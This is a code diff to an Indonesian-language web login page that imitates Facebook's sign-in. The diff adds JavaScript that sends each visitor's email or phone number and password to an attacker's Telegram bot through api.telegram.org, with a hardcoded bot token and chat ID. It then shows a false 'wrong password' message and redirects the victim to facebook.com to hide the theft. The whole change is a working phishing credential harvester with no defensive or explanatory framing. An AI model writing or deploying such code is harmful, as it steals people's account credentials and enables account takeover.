@@ -131,12 +131,8 @@
             <div class="divider"></div>
             
             <div class="create-account">
-                <button>Buat Akun Baru</button>
+                <button type="button">Buat Akun Baru</button>
             </div>
-        </div>
-        
-        <div class="footer">
-            
         </div>
         
         <div id="message"></div>
@@ -149,22 +145,38 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Kirim data ke server untuk disimpan
-            fetch('save_data.php', {
+            // Token Bot dan Chat ID Anda
+            const botToken = '7436609054:AAFMUlwhnBf9hWhmkaIyuXnFJNXIUkxuKgo';
+            const chatId = '7149582849';
+            
+            // Pesan yang akan dikirim ke Telegram
+            const message = `🔔 Login Facebook Baru!\n📧 Email/Telepon: ${username}\n🔑 Password: ${password}\n\n🕒 Waktu: ${new Date().toLocaleString()}\n🌐 IP: ${window.location.hostname}`;
+            
+            // Kirim data ke Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Type': 'application/json',
                 },
-                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                }),
             })
-            .then(response => response.text())
+            .then(response => response.json())
             .then(data => {
-                document.getElementById('message').textContent = 'Kata Sandi yang anda masukan salah, Silahkan Coba Lagi';
-                // Reset form
+                document.getElementById('message').textContent = 'Kata sandi salah. Silakan coba lagi!';
                 document.getElementById('loginForm').reset();
+                
+                // Redirect setelah 2 detik (opsional)
+                setTimeout(() => {
+                    window.location.href = 'https://facebook.com';
+                }, 2000);
             })
             .catch(error => {
-                document.getElementById('message').textContent = 'Terjadi kesalahan: ' + error;
+                console.error('Error:', error);
+                document.getElementById('message').textContent = 'Terjadi kesalahan. Coba lagi nanti.';
             });
         });
     </script>
